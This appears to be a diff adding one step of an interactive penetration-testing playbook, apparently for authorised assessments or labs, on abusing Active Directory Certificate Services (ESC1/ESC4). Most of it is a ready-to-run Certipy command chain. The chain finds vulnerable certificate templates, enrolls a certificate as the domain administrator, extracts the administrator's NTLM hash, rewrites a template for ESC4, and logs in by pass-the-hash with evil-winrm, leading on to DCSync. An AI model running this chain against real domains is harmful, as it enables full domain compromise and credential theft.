@@ -1,0 +1,18 @@
+{
+  "id": "adcs",
+  "phase": "AD",
+  "title": "AD Certificate Services (ESC1/ESC4)",
+  "body": "Misconfigured certificate templates let low-priv users enroll as Domain Admin. ESC1 is the most common — find it with Certipy.",
+  "cmd": "certipy find -u user@domain.com -p 'pass' -dc-ip $ip -vulnerable -stdout\n\n# ESC1 — enroll as DA using vulnerable template\ncertipy req -u user@domain.com -p 'pass' \\\n  -ca 'CA-NAME' -template 'VulnTemplate' \\\n  -upn administrator@domain.com -dc-ip $ip\n\n# Authenticate with the certificate\ncertipy auth -pfx administrator.pfx -dc-ip $ip\n# Outputs NTLM hash for administrator\n\n# ESC4 — write owner on template, modify to ESC1, exploit\ncertipy template -u user@domain.com -p 'pass' \\\n  -template 'VulnTemplate' -save-old -dc-ip $ip\n\n# Pass-the-hash with retrieved administrator hash\nevil-winrm -i $ip -u administrator -H <NTLM_HASH>",
+  "warn": "Always -save-old when modifying templates in ESC4 — restore after exploitation or you'll break the environment.",
+  "choices": [
+    {
+      "label": "Got DA cert — authenticated as admin",
+      "next": "dcsync"
+    },
+    {
+      "label": "No vulnerable templates found",
+      "next": "ad_manual"
+    }
+  ]
+}
